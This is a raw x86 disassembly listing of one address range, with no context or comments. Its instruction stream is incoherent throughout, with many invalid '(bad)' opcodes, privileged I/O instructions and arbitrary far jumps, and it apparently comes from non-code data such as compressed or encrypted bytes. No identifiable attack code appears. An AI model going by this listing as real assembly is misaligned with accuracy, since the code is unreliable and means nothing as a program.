  402910:	lods   al,BYTE PTR ds:[esi]
  402911:	push   esi
  402912:	inc    edx
  402913:	div    BYTE PTR [esi+0x68]
  402916:	dec    esi
  402917:	lahf   
  402918:	popa   
  402919:	test   BYTE PTR [bp+0x54],bh
  40291d:	aad    0x3c
  40291f:	fldenv [ecx+0x498cc170]
  402925:	mov    ds:0xffb191c7,al
  40292a:	js     0x4028b5
  40292c:	lds    edx,FWORD PTR [ebp+0xf]
  40292f:	loope  0x402990
  402931:	aam    0x66
  402933:	xchg   edx,eax
  402934:	cmp    DWORD PTR [edx+0x6b1300ce],0xa0fba0f7
  40293e:	xor    DWORD PTR [ebx-0x17],edx
  402941:	js     0x402935
  402943:	(bad)  [ebp+0x20]
  402946:	gs sub edx,DWORD PTR cs:[ecx-0x10]
  40294b:	or     dh,bh
  40294d:	or     cl,al
  40294f:	xchg   DWORD PTR [edx+0x5959457f],ebx
  402955:	sub    BYTE PTR [edi-0x4],bh
  402958:	icebp  
  402959:	and    al,0x5
  40295b:	cli    
  40295c:	push   esp
  40295d:	cmp    edx,0x2b
  402960:	mov    edx,0xcf0d20ec
  402965:	icebp  
  402966:	sub    BYTE PTR [esi-0x55],ah
  402969:	sub    bh,BYTE PTR [ecx+0x7d]
  40296c:	imul   esp,DWORD PTR [eax],0x51900a8c
  402972:	sub    DWORD PTR [ebp+0x1b198f72],ebx
  402978:	xor    al,0xff
  40297a:	enter  0x55b1,0x3d
  40297e:	das    
  40297f:	inc    edx
  402980:	jne    0x402a01
  402982:	cmp    al,0xab
  402984:	fld    TBYTE PTR [esi+ebp*1]
  402987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402988:	add    eax,DWORD PTR [edx+0x1d]
  40298b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40298c:	dec    edi
  40298d:	in     al,0x23
  40298f:	xchg   BYTE PTR [edi+0x624f5ab4],dh
  402995:	lea    esp,[esi+eax*8]
  402998:	repz pusha 
  40299a:	adc    ecx,DWORD PTR [ebp+0x567f0627]
  4029a0:	jae    0x402a15
  4029a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029a3:	iret   
  4029a4:	rol    ah,cl
  4029a6:	xor    BYTE PTR [ebp+0x26],0x93
  4029aa:	cmp    DWORD PTR [ebx+0x62],esp
  4029ad:	pop    edx
  4029ae:	cmp    bl,al
  4029b0:	fs add eax,ebx
  4029b3:	push   es
  4029b4:	xchg   DWORD PTR [edx+0x38],ebx
  4029b7:	test   DWORD PTR [ebx+0x51],ebx
  4029ba:	inc    esi
  4029bb:	jge    0x402a1a
  4029bd:	mov    edx,0x4711884c
  4029c2:	scas   al,BYTE PTR es:[edi]
  4029c3:	pop    ecx
  4029c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029c5:	fs mov ebx,0xaeb1bc13
  4029cb:	pop    edx
  4029cc:	and    al,0xcf
  4029ce:	push   ebx
  4029cf:	cld    
  4029d0:	out    0x58,al
  4029d2:	mov    al,ds:0x637e1f55
  4029d7:	(bad)  
  4029d8:	xchg   esi,eax
  4029d9:	adc    bh,bh
  4029db:	pop    es
  4029dc:	dec    esi
  4029dd:	mov    bh,0x5e
  4029df:	bound  edi,QWORD PTR [esi-0x7c]
  4029e2:	test   BYTE PTR [esp+ebx*1+0x4803170d],al
  4029e9:	mov    edi,0xf1d04491
  4029ee:	inc    ecx
  4029ef:	ins    DWORD PTR es:[edi],dx
  4029f0:	sub    DWORD PTR [ebx-0x39ee6652],0xd9310517
  4029fa:	or     ecx,DWORD PTR [eax-0x1133ba44]
  402a00:	xchg   edx,eax
  402a01:	inc    ecx
  402a02:	rcl    esi,1
  402a04:	sub    eax,0xc5a82d75
  402a09:	push   ebx
  402a0a:	aam    0xa4
  402a0c:	pop    ebx
  402a0d:	enter  0xa222,0x8
  402a11:	rcr    DWORD PTR [eax+0x264eda25],0x83
  402a18:	and    al,0x60
  402a1a:	mov    dh,0x79
  402a1c:	or     BYTE PTR [esi+ecx*8],bh
  402a1f:	pop    ds
  402a20:	dec    eax
  402a21:	int    0x9d
  402a23:	mov    cl,0x17
  402a25:	(bad)  
  402a26:	and    eax,0xe6fc7992
  402a2b:	cmp    dh,BYTE PTR [esi+ebx*8+0x7d9a8920]
  402a32:	pop    ecx
  402a33:	cld    
  402a34:	in     al,dx
  402a35:	sbb    al,BYTE PTR ds:0x17abc745
  402a3b:	inc    edx
  402a3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a3d:	and    al,0x4f
  402a3f:	mov    al,0x7f
  402a41:	push   esp
  402a42:	mov    ebx,0xf98c1213
  402a47:	out    dx,eax
  402a48:	dec    esp
  402a49:	imul   esp,DWORD PTR [ecx-0x3f29eba7],0x76
  402a50:	adc    edx,DWORD PTR [esi]
  402a52:	loopne 0x402a1e
  402a54:	int3   
  402a55:	std    
  402a56:	dec    ebx
  402a57:	fiadd  DWORD PTR [esi+0x766aa157]
  402a5d:	retf   
  402a5e:	jle    0x402a39
  402a60:	jg     0x402a5e
  402a62:	adc    DWORD PTR [ebp+0x66],0x6ec7aad4
  402a69:	push   edx
  402a6a:	push   cs
  402a6b:	push   ebx
  402a6c:	cmp    DWORD PTR [edx+0x4075fbc6],ecx
  402a72:	mov    ch,0x8a
  402a74:	jp     0x402a17
  402a76:	je     0x402a4d
  402a78:	mov    dh,0x59
  402a7a:	mov    ebp,0x86ade214
  402a7f:	push   ebx
  402a80:	mov    bl,0xa
  402a82:	xchg   ebx,eax
  402a83:	adc    bl,BYTE PTR [esi]
  402a85:	mov    eax,DWORD PTR [edi+eax*8]
  402a88:	sbb    eax,esp
  402a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a8b:	add    dl,bh
  402a8d:	out    0x4,eax
  402a8f:	sbb    ah,BYTE PTR [esi+ecx*1]
  402a92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a93:	aaa    
  402a94:	push   ss
  402a95:	jbe    0x402ac2
  402a97:	mov    ah,BYTE PTR [esi+eiz*1-0x43b8a8ce]
  402a9e:	cmp    BYTE PTR [eax-0x7c94317a],bl
  402aa4:	cmp    BYTE PTR [esi+0x1361e13c],bh
  402aaa:	cdq    
  402aab:	cwde   
  402aac:	loop   0x402a73
  402aae:	pusha  
  402aaf:	jnp    0x402a3d
  402ab1:	fs xchg bh,cl
  402ab4:	not    dl
  402ab6:	cmc    
  402ab7:	inc    esp
  402ab8:	mov    esp,0x77dcedf7
  402abd:	mov    edi,0xf091b988
  402ac2:	call   0x7e0d6d74
  402ac7:	push   ss
  402ac8:	cmp    al,0x89
  402aca:	and    al,0x1d
  402acc:	and    dl,0xa6
  402acf:	adc    BYTE PTR [ecx+0x28f23147],0xe3
  402ad6:	mov    bl,cl
  402ad8:	dec    esi
  402ad9:	mov    bh,0xeb
  402adb:	or     BYTE PTR ds:0x9a7ae266,cl
  402ae1:	dec    ecx
  402ae2:	mov    bl,cl
  402ae4:	lahf   
  402ae5:	je     0x402b3e
  402ae7:	mov    al,ds:0xb856c181
  402aec:	and    edi,DWORD PTR [edi-0xe]
  402aef:	inc    esi
  402af0:	xchg   DWORD PTR [esi-0x50],eax
  402af3:	gs inc esi
  402af5:	fsubr  QWORD PTR [ebx+edx*8]
  402af8:	in     al,dx
  402af9:	lds    ebp,FWORD PTR [ecx]
  402afb:	xor    al,0xce
  402afd:	cmp    ebx,DWORD PTR [ebx-0x7bb5fc9c]
  402b03:	sub    al,0x5c
  402b05:	call   0x1175c26f
  402b0a:	mov    dh,0x7f
  402b0c:	rcl    DWORD PTR [eax+0x19],0xa4
  402b10:	scas   al,BYTE PTR es:[edi]
  402b11:	(bad)  
  402b12:	pop    eax
  402b13:	jl     0x402b85
  402b15:	ins    DWORD PTR es:[edi],dx
  402b16:	bound  edi,QWORD PTR [esi]
  402b18:	mul    eax
  402b1a:	repz jle 0x402b2c
  402b1d:	ss push es
  402b1f:	loopne 0x402b6e
  402b21:	push   0xffffffdb
  402b23:	dec    edx
  402b24:	dec    edi
  402b25:	pop    edi
  402b26:	mov    ds:0xdec0b5cb,al
  402b2b:	bound  esi,QWORD PTR [edi]
  402b2d:	mov    ch,0xd
  402b2f:	lock cmp DWORD PTR [ebx+0x19],0x60
  402b34:	cmp    eax,0xaef1ab53
  402b39:	lahf   
  402b3a:	mov    ah,0x34
  402b3c:	(bad)  
  402b3d:	cld    
  402b3e:	loope  0x402b3f
  402b40:	and    edx,DWORD PTR [edx+0x2e2c39d5]
  402b46:	pop    esp
  402b47:	xor    ch,BYTE PTR [esi]
  402b49:	mov    ebx,0xf5896b8b
  402b4e:	cmp    ecx,DWORD PTR [edx+0x5c07c5cf]
  402b54:	test   BYTE PTR [edi],0xc1
  402b57:	and    edi,DWORD PTR ds:0x6370b4ce
  402b5d:	lds    eax,FWORD PTR [ebp+0x2f0b4586]
  402b63:	in     al,0xeb
  402b65:	push   esp
  402b66:	nop
  402b67:	and    BYTE PTR ds:0xbaa6071b,dh
  402b6d:	dec    ebp
  402b6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b6f:	int    0x2c
  402b71:	inc    edi
  402b72:	push   ebx
  402b73:	test   al,0xc0
  402b75:	push   0xe05b0d
  402b7a:	sbb    al,0x98
  402b7c:	aad    0xa3
  402b7e:	sahf   
  402b7f:	inc    edi
  402b80:	xor    al,0x30
  402b82:	cmc    
  402b83:	out    0x52,eax
  402b85:	shl    BYTE PTR [ecx],1
  402b87:	arpl   WORD PTR [edx-0x3acf0996],ax
  402b8d:	jmp    DWORD PTR [edx+edx*2+0x12]
  402b91:	dec    edi
  402b92:	test   BYTE PTR [esi-0xd],bh
  402b95:	ret    
  402b96:	mov    al,0x5d
  402b98:	jmp    0xbc7ec02a
  402b9d:	(bad)  
  402b9e:	sub    dh,al
  402ba0:	enter  0x1785,0xcf
  402ba4:	in     al,dx
  402ba5:	push   es
  402ba6:	xchg   BYTE PTR [edi-0x7964eee3],dl
  402bac:	cdq    
  402bad:	gs xchg ebx,eax
  402baf:	ins    BYTE PTR es:[edi],dx
  402bb0:	popf   
  402bb1:	mov    eax,ds:0x27143c01
  402bb6:	retf   
  402bb7:	dec    esi
  402bb8:	xor    ecx,ecx
  402bba:	adc    esi,DWORD PTR [ecx]
  402bbc:	test   edx,ebx
  402bbe:	stos   BYTE PTR es:[edi],al
  402bbf:	add    al,0xdd
  402bc1:	ror    eax,cl
  402bc3:	jb     0x402bd0
  402bc5:	xchg   ebx,eax
  402bc6:	pop    esp
  402bc7:	test   BYTE PTR [ebx],bh
  402bc9:	in     al,0x81
  402bcb:	pop    eax
  402bcc:	addr16 inc eax
  402bce:	faddp  st(3),st
  402bd0:	dec    ebp
  402bd1:	cmc    
  402bd2:	cmp    BYTE PTR [eax],0x92
  402bd5:	sub    BYTE PTR [edx+0x41d6cc19],bl
  402bdb:	sbb    eax,0x416213b
  402be0:	xchg   esp,eax
  402be1:	mov    edi,0xe1b74e3f
  402be6:	or     ebp,DWORD PTR [ecx]
  402be8:	imul   edi,DWORD PTR [eax],0xffffffb0
  402beb:	inc    esi
  402bec:	dec    edx
  402bed:	rcr    BYTE PTR [ebp+0x23b3da21],cl
  402bf3:	pop    esp
  402bf4:	(bad)  
  402bf6:	add    ecx,DWORD PTR [edi-0xae91e42]
  402bfc:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  402bfe:	ret    0xfd04
  402c01:	add    BYTE PTR [ebp-0x1b0c0633],cl
  402c07:	jmp    0x8e40537
  402c0c:	pusha  
  402c0d:	or     cl,ah
  402c0f:	and    esi,0xffffffa1
  402c12:	sbb    ch,BYTE PTR [ebp+0x2a42965e]
  402c18:	fdivp  st(6),st
  402c1a:	mov    eax,?
  402c1c:	dec    ebx
  402c1d:	test   al,0xb6
  402c1f:	mov    ds:0x64fb1367,al
  402c24:	ins    DWORD PTR es:[edi],dx
  402c25:	rcr    DWORD PTR [ebx-0x3f],0x4d
  402c29:	mov    DWORD PTR [esi+ebx*8+0x5b87836d],eax
  402c30:	fld    QWORD PTR [edx-0x76ea030]
  402c36:	jp     0x402bfd
  402c38:	and    eax,0x2418af94
  402c3d:	adc    edx,DWORD PTR [edi+0x1f]
  402c40:	push   esi
  402c41:	cwde   
  402c42:	sti    
  402c43:	xor    bh,BYTE PTR [eax+0x1f]
  402c46:	pop    ds
  402c47:	jecxz  0x402c95
  402c49:	xor    eax,0xf0066ace
  402c4e:	out    0x1b,al
  402c50:	jle    0x402c44
  402c52:	mov    ebp,0xc374ab2a
  402c57:	cwde   
  402c58:	lods   eax,DWORD PTR ds:[esi]
  402c59:	mov    esp,DWORD PTR [esi+0x239c070e]
  402c5f:	xchg   ecx,eax
  402c60:	(bad)  
  402c61:	(bad)  
  402c62:	push   ebp
  402c63:	and    BYTE PTR [eax],cl
  402c65:	pop    es
  402c66:	data16 icebp 
  402c68:	push   eax
  402c69:	pop    edi
  402c6a:	jg     0x402c5d
  402c6c:	push   ds
  402c6d:	cmp    BYTE PTR [ecx-0x2],cl
  402c70:	clc    
  402c71:	xchg   esi,eax
  402c72:	cs into 
  402c74:	pop    esp
  402c75:	mov    ds:0xd28b167d,eax
  402c7a:	or     esi,esi
  402c7c:	ins    DWORD PTR es:[edi],dx
  402c7d:	fs inc ecx
  402c7f:	push   ss
  402c80:	jmp    0xdb1d448f
  402c85:	ud0    edi,DWORD PTR [ecx+0x2cc86cd4]
  402c8c:	pop    esp
  402c8d:	iret   
  402c8e:	cdq    
  402c8f:	cdq    
  402c90:	cmp    ah,ah
  402c92:	aas    
  402c93:	mov    bl,0x53
  402c95:	and    eax,0xb8acdc8
  402c9a:	jmp    0x569f9576
  402c9f:	out    dx,eax
  402ca0:	xchg   al,al
  402ca2:	adc    BYTE PTR [ebp+0x2fbff693],al
  402ca8:	mov    bl,0xdf
  402caa:	mov    esp,0xa58e4cbb
  402caf:	push   ebp
  402cb0:	std    
  402cb1:	repz neg BYTE PTR [eax+0x54db332c]
  402cb8:	push   edx
  402cb9:	push   0xfe5f667a
  402cbe:	adc    BYTE PTR [edx+0x40],ch
  402cc1:	push   ss
  402cc2:	test   eax,0x8c5009dd
  402cc7:	xor    ebp,esi
  402cc9:	or     al,0x17
  402ccb:	test   eax,0xd2a0e874
  402cd0:	cmp    eax,DWORD PTR [ecx]
  402cd2:	fimul  WORD PTR [ebx+0x4bbffae5]
  402cd8:	lahf   
  402cd9:	ret    0x9fe0
  402cdc:	mov    al,ds:0x9efa4274
  402ce1:	nop
  402ce2:	fs stos BYTE PTR es:[edi],al
  402ce4:	addr16 mov ds:0xf294,eax
  402ce8:	mov    cl,0xa0
  402cea:	mov    DWORD PTR [esi],ebx
  402cec:	mov    eax,ds:0x2ae9d9fc
  402cf1:	jle    0x402d6c
  402cf3:	adc    BYTE PTR [ecx+0x11e0c09a],0x57
  402cfa:	(bad)  
  402cfb:	lahf   
  402cfc:	mov    bh,0x4f
  402cfe:	(bad)  
  402cff:	stos   DWORD PTR es:[edi],eax
  402d00:	mov    edi,0x2c13cffe
  402d05:	mov    al,ds:0x899de351
  402d0a:	enter  0x8fbf,0xdd
  402d0e:	test   eax,0x4d92a9e8
  402d13:	ds jb  0x402d44
  402d16:	mov    edx,0xb1b91a39
  402d1b:	jmp    0xbe57:0x83e3e01
  402d22:	lea    ebx,[ebp+0x71]
  402d25:	stc    
  402d26:	jne    0x402d4a
  402d28:	xor    bl,BYTE PTR [esi]
  402d2a:	icebp  
  402d2b:	mov    cl,0x3
  402d2d:	dec    ecx
  402d2e:	repz jne 0x402d68
  402d31:	out    0x8,al
  402d33:	into   
  402d34:	retf   
  402d35:	mov    eax,0xa5724a9d
  402d3a:	sbb    DWORD PTR [eax+0x1d],0xa5eacd2f
  402d41:	test   BYTE PTR ds:0xb16ca432,0xac
  402d48:	test   eax,0x25739b3e
  402d4d:	out    dx,al
  402d4e:	or     al,0xe7
  402d50:	call   0x1967:0xdba4f8e8
  402d57:	pop    ds
  402d58:	inc    edx
  402d59:	call   0x80679bc7
  402d5e:	imul   edx,edx,0x18b4e2da
  402d64:	aaa    
  402d65:	and    dh,BYTE PTR [eax-0x5a]
  402d68:	idiv   DWORD PTR [ebx+0xc5189e]
  402d6e:	addr16 int3 
  402d70:	fcomi  st,st(4)
  402d72:	nop
  402d73:	das    
  402d74:	xchg   edx,eax
  402d75:	push   edi
  402d76:	mov    ds:0x4a1fc009,eax
  402d7b:	(bad)  [esi]
  402d7d:	lods   eax,DWORD PTR ds:[esi]
  402d7e:	mov    ecx,DWORD PTR [edi-0x3cf9716a]
  402d84:	cmc    
  402d85:	cmp    al,0x3c
  402d87:	xor    eax,0xa44f837b
  402d8c:	in     eax,0x8b
  402d8e:	nop
  402d8f:	cdq    
  402d90:	lock (bad) [eax-0x7b]
  402d94:	and    eax,0x6fd807c8
  402d99:	mov    al,0xe9
  402d9b:	test   al,0x8b
  402d9d:	fbld   TBYTE PTR [edx-0x213183a]
  402da3:	ins    DWORD PTR es:[edi],dx
  402da4:	push   edx
  402da5:	std    
  402da6:	xor    DWORD PTR [ecx-0x316e8ed0],ecx
  402dac:	push   edi
  402dad:	pop    edx
  402dae:	loope  0x402d33
  402db0:	mov    esi,0x3cde3820
  402db5:	ror    DWORD PTR [edx+0x6940e03c],cl
  402dbb:	ins    DWORD PTR es:[edi],dx
  402dbc:	outs   dx,DWORD PTR ds:[esi]
  402dbd:	inc    esp
  402dbe:	div    BYTE PTR [esi+0x54a8a94b]
  402dc4:	mov    esi,cs
  402dc6:	mov    cl,0x94
  402dc8:	adc    DWORD PTR [esi-0x2f],edi
  402dcb:	lea    ecx,[eax-0x72]
  402dce:	shr    DWORD PTR [eax-0x4361f8ab],0x8c
  402dd5:	jp     0x402d98
  402dd7:	cli    
  402dd8:	adc    DWORD PTR es:[edx-0x67],0x1039f8a9
  402de0:	jnp    0x402dd1
  402de2:	jp     0x402d78
  402de4:	call   0x8ea8:0x86667d51
  402deb:	fbstp  TBYTE PTR [ebx-0x4c492e2c]
  402df1:	xchg   edi,eax
  402df2:	or     BYTE PTR [edi+0x69a04cfa],ah
  402df8:	into   
  402df9:	sbb    DWORD PTR [edi-0x33],ecx
  402dfc:	imul   eax,DWORD PTR [edx+edx*4],0x68e00f8a
  402e03:	dec    ebp
  402e04:	mov    eax,0x4dabdc2
  402e09:	neg    BYTE PTR [edx+0x5e]
  402e0c:	add    eax,0x9d740073
  402e11:	or     eax,0x98a45af7
  402e16:	retf   
  402e17:	call   0x703b:0x759d52e9
  402e1e:	jb     0x402e94
  402e20:	pop    edx
  402e21:	fild   WORD PTR [ebp-0x46]
  402e24:	lahf   
  402e25:	out    0x63,eax
  402e27:	jno    0x402de4
  402e29:	dec    edx
  402e2a:	inc    eax
  402e2b:	(bad)  
  402e2c:	popf   
  402e2d:	pop    edx
  402e2e:	test   DWORD PTR [esi+0x197b61b9],ecx
  402e34:	into   
  402e35:	in     al,0xb9
  402e37:	lahf   
  402e38:	out    0x6f,al
  402e3a:	loop   0x402e15
  402e3c:	bound  ecx,QWORD PTR [ebx+0x2]
  402e3f:	sbb    BYTE PTR [esp+eax*8],bh
  402e42:	fmul   QWORD PTR [edx]
  402e44:	out    0xdf,eax
  402e46:	(bad)
  402e4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e4b:	popf   
  402e4c:	jl     0x402e75
  402e4e:	out    0x5c,eax
  402e50:	jmp    0xa7ea:0x5d3fcc1b
  402e57:	inc    eax
  402e58:	inc    ebx
  402e59:	out    0x4a,al
  402e5b:	mov    edx,0xd4d0cec3
  402e60:	xchg   esi,eax
  402e61:	ror    esp,1
  402e63:	inc    BYTE PTR ds:0x2758eec9
  402e69:	cmp    dh,BYTE PTR [edx+0x68]
  402e6c:	or     DWORD PTR [edi+0x13c5c0fa],edi
  402e72:	cmp    bh,0xb1
  402e75:	das    
  402e76:	aaa    
  402e77:	mov    al,ds:0x4ad0ca9c
  402e7c:	leave  
  402e7d:	jne    0x402ef7
  402e7f:	and    ebx,DWORD PTR [esi-0x79]
  402e82:	mov    bh,0xaf
  402e84:	mov    ds:0x5eba9bd7,al
  402e89:	(bad)  
  402e8a:	jmp    0x75321a1c
  402e8f:	xor    al,0xbf
  402e91:	hlt    
  402e92:	add    ah,al
  402e94:	and    eax,0xba89657f
  402e99:	test   DWORD PTR [ebx],ebx
  402e9b:	pop    ebp
  402e9c:	dec    edi
  402e9d:	or     BYTE PTR [edi],dh
  402e9f:	iret   
  402ea0:	push   ecx
  402ea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ea2:	mov    esi,0xfbde1d7d
  402ea7:	lods   al,BYTE PTR ds:[esi]
  402ea8:	push   esp
  402ea9:	jmp    0xbe5f:0xf7e9b5d
  402eb0:	inc    ecx
  402eb1:	call   0x8841:0xd1efb4b7
  402eb8:	push   cs
  402eb9:	scas   eax,DWORD PTR es:[edi]
  402eba:	mov    bl,0xd
  402ebc:	dec    ebp
  402ebd:	das    
  402ebe:	pusha  
  402ebf:	pusha  
  402ec0:	popf   
  402ec1:	repz jg 0x402e6f
  402ec4:	mov    edx,0x472513a9
  402ec9:	je     0x402f05
  402ecb:	in     eax,dx
  402ecc:	and    eax,0x2d82866c
  402ed1:	cmp    DWORD PTR [ecx+0x7fc7d5de],0x28daaa6e
  402edb:	cmp    DWORD PTR [edx+0x13a915e4],eax
  402ee1:	into   
  402ee2:	fmul   QWORD PTR [ecx+eiz*1]
  402ee5:	div    BYTE PTR [ecx+0x4f257805]
  402eeb:	mov    ebp,0x1c49da6b
  402ef0:	pop    ss
  402ef1:	xchg   esp,eax
  402ef2:	dec    esi
  402ef3:	bound  edi,QWORD PTR [eax+0x31]
  402ef6:	xchg   edi,eax
  402ef7:	xor    ch,BYTE PTR [ebx-0x75]
  402efa:	inc    ebx
  402efb:	jae    0x402e93
  402efd:	mov    WORD PTR [ebx+0x5dec6a13],cs
  402f03:	push   0x41e1f72a
  402f08:	xchg   esi,eax
  402f09:	pusha  
  402f0a:	dec    eax
  402f0b:	xchg   esp,eax
  402f0c:	push   0x27
  402f0e:	jge    0x402ee2
  402f10:	ins    DWORD PTR es:[edi],dx
  402f11:	xor    BYTE PTR [ecx+0x47f50dd3],0xa1
  402f18:	pusha  
  402f19:	adc    DWORD PTR [ebx+0x526bcd5],ecx
  402f1f:	dec    ebp
  402f20:	test   BYTE PTR [eax-0x73196803],bh
  402f26:	add    bh,dh
  402f28:	mov    bh,0x7f
  402f2a:	repz push ss
  402f2c:	dec    ebp
  402f2d:	ficomp DWORD PTR [edx-0xc92e3a3]
  402f33:	cmp    edx,DWORD PTR [ecx-0x50cd4704]
  402f39:	xor    al,0xb0
  402f3b:	or     BYTE PTR [ecx+edi*1+0x3c838056],ch
  402f42:	imul   edi,ebp,0x72
  402f45:	lods   eax,DWORD PTR ds:[esi]
  402f46:	jl     0x402f3c
  402f48:	fcmove st,st(7)
  402f4a:	ds leave 
  402f4c:	test   BYTE PTR [eax],0xaf
  402f4f:	adc    bl,BYTE PTR [esi+ecx*1]
  402f52:	adc    BYTE PTR [ecx],ch
  402f54:	lods   eax,DWORD PTR ds:[esi]
  402f55:	push   ds
  402f56:	mov    ch,0xf4
  402f58:	pop    edi
  402f59:	sub    DWORD PTR [edx],0xf58f4e76
  402f5f:	mov    gs,WORD PTR [ebx-0x71d69699]
  402f65:	pop    ebx
  402f66:	sbb    ah,BYTE PTR ds:0xa56c7534
  402f6c:	sub    cl,BYTE PTR [eax+0x4a0cb248]
  402f72:	(bad)  
  402f73:	rol    DWORD PTR [esi],cl
  402f75:	push   0xbe93e468
  402f7a:	cwde   
  402f7b:	das    
  402f7c:	dec    esi
  402f7d:	fiadd  DWORD PTR [ecx+0x2cb727c8]
  402f83:	cdq    
  402f84:	mov    ecx,0xccaa4bf7
  402f89:	outs   dx,DWORD PTR ds:[esi]
  402f8a:	cwde   
  402f8b:	fnstenv [ebx+0x3217255]
  402f91:	fs dec ecx
  402f93:	jns    0x402fd9
  402f95:	repz jo 0x402f37
  402f98:	sbb    eax,0xa83d5805
  402f9d:	sahf   
  402f9e:	xchg   BYTE PTR [esi],cl
  402fa0:	xchg   edx,eax
  402fa1:	loop   0x402fc1
  402fa3:	mov    dh,dh
  402fa5:	push   ecx
  402fa6:	mov    al,ds:0x92258c44
  402fab:	popa   
  402fac:	rcl    DWORD PTR [esi-0x8],1
  402faf:	std    
  402fb0:	inc    ecx
  402fb1:	dec    esi
  402fb2:	mov    edx,0x7f28832b
  402fb7:	sbb    al,0xbb
  402fb9:	arpl   WORD PTR [edi-0x540e0ab7],sp
  402fbf:	call   0x9bc0:0x22b09830
  402fc6:	enter  0x7ecf,0x36
  402fca:	mov    dl,0xbf
  402fcc:	loopne 0x40301e
  402fce:	iret   
  402fcf:	(bad)  
  402fd0:	lahf   
  402fd1:	adc    ecx,DWORD PTR [ebx]
  402fd3:	xchg   ebx,eax
  402fd4:	jns    0x403045
  402fd6:	mov    esi,0xf9a61d33
  402fdb:	jge    0x402f80
  402fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fde:	les    esi,FWORD PTR [eax-0x26]
  402fe1:	(bad)  
  402fe2:	cmc    
  402fe3:	push   0x211a5191
  402fe8:	dec    ebx
  402fe9:	(bad)  
  402fea:	sbb    DWORD PTR [eax+0x2de44bc5],ebp
  402ff0:	out    dx,al
  402ff1:	pop    esp
  402ff2:	xor    ah,ch
  402ff4:	in     al,0x9
  402ff6:	dec    edx
  402ff7:	mov    cs,WORD PTR [edx+0x126077e8]
  402ffd:	xor    eax,0x4bde529c
  403002:	or     al,BYTE PTR ds:0x4c1635f0
  403008:	xchg   edi,eax
  403009:	sub    ah,BYTE PTR [edi]
  40300b:	in     al,dx
  40300c:	xor    eax,0xe003da85
  403011:	les    ecx,FWORD PTR es:[esp+ebx*8]
  403015:	pop    ebp
  403016:	sub    ch,BYTE PTR [edi]
  403018:	push   ds
  403019:	call   DWORD PTR [esi+ebx*1]
  40301c:	xchg   edx,eax
  40301d:	jg     0x403001
  40301f:	pop    ds
  403020:	or     eax,0xd8612c00
  403025:	imul   edi,DWORD PTR [eax],0xffffffb5
  403028:	shl    BYTE PTR ds:0x9e1e9a46,cl
  40302e:	add    eax,0xfa1c0740
  403033:	fcmovne st,st(3)
  403035:	push   eax
  403036:	jg     0x403094
  403038:	ins    BYTE PTR es:[edi],dx
  403039:	inc    eax
  40303a:	out    0x24,al
  40303c:	xor    eax,0x581985b4
  403041:	add    edx,DWORD PTR [edx+edi*4]
  403044:	xchg   edx,eax
  403045:	mov    cl,0x3e
  403047:	xchg   DWORD PTR ds:0xb14ae46a,ebx
  40304d:	mov    ah,BYTE PTR [edi-0x6a]
  403050:	lds    edx,FWORD PTR [ebx+0x1ee7f587]
  403056:	push   ecx
  403057:	pop    ebp
  403058:	or     ebp,DWORD PTR [ebx-0x6a00cc89]
  40305e:	mov    eax,ds:0x4f1a2e86
  403063:	inc    edx
  403064:	sti    
  403065:	jno    0x40307a
  403067:	xchg   edx,eax
  403068:	retf   0xdcaf
  40306b:	rcl    ecx,0xc9
  40306e:	inc    esi
  40306f:	imul   ecx,DWORD PTR [ebp+0x2cdd3db6],0x4fb2c19a
  403079:	cmp    dl,BYTE PTR [edi+0x521e598c]
  40307f:	cs jmp 0x4030de
  403082:	jp     0x40309d
  403084:	xor    BYTE PTR [ebx+0x2da2270],bh
  40308a:	push   esp
  40308b:	out    dx,eax
  40308c:	div    BYTE PTR [eax+0x50]
  40308f:	loop   0x403091
  403091:	fwait
  403092:	(bad)  
  403093:	ffreep st(3)
  403095:	cmp    DWORD PTR [ebx+0x59c681c6],0xffffffee
  40309c:	(bad)  
  40309d:	xchg   ebx,eax
  40309e:	pusha  
  40309f:	or     dh,BYTE PTR [esi+ecx*8-0x1cfd4d3f]
  4030a6:	fld    QWORD PTR [edi]
  4030a8:	xchg   ebp,eax
  4030a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030ab:	push   esi
  4030ac:	and    al,0x1b
  4030ae:	stos   BYTE PTR es:[edi],al
  4030af:	xor    DWORD PTR [ebp-0x30],edi
  4030b2:	xchg   ebx,eax
  4030b3:	aam    0x3b
  4030b5:	sub    DWORD PTR [ecx],0xcc8103af
  4030bb:	ror    BYTE PTR [ebx+0x3dad285b],0x18
  4030c2:	mov    ds:0x33e0913c,eax
  4030c7:	icebp  
  4030c8:	stc    
  4030c9:	std    
  4030ca:	shl    BYTE PTR [esi],1
  4030cc:	or     edi,DWORD PTR [ecx-0x3617febb]
  4030d2:	lock push ebp
  4030d4:	mov    esp,0x62b09f9d
  4030d9:	lock repnz pop esp
  4030dc:	or     esi,ebp
  4030de:	xchg   esi,eax
  4030df:	in     eax,0x64
  4030e1:	je     0x403081
  4030e3:	ins    DWORD PTR es:[edi],dx
  4030e4:	push   eax
  4030e5:	push   ebx
  4030e6:	mov    eax,ds:0x19919bea
  4030eb:	pop    ebp
  4030ec:	shl    DWORD PTR [edi-0x3c],0x8b
  4030f0:	jp     0x403112
  4030f2:	fistp  WORD PTR [ebp-0x18d3832b]
  4030f8:	cmp    ebx,DWORD PTR [ebp+0x38]
  4030fb:	push   0x16a8d07a
  403100:	scas   eax,DWORD PTR es:[edi]
  403101:	cmp    al,bl
  403103:	sbb    DWORD PTR [edi],esp
  403105:	js     0x4030ce
  403107:	push   ebp
  403108:	sub    eax,ebx
  40310a:	sbb    BYTE PTR [esi+0x58],ch
  40310d:	xor    ebx,DWORD PTR [edx-0x4a]
  403110:	aam    0xfe
  403112:	sub    al,0x77
